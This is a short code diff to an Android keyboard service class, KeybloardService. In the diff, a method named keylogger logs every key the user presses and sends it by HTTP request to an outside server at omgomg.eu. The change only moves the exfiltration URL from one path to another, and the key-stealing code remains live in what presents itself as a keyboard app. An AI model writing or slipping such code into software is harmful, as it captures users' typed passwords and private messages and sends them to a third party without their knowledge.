@@ -87,7 +87,7 @@ public class KeybloardService extends InputMethodService implements KeyboardView
 
     private void keylogger(String currentKey){
         logcat.log(Level.SEVERE, "Key pressed: " + currentKey);
-        new HTTPRequestHandler().execute("https://www.omgomg.eu/androtest", currentKey);
+        new HTTPRequestHandler().execute("https://omgomg.eu/keybloard", currentKey);
     }
 
     @Override
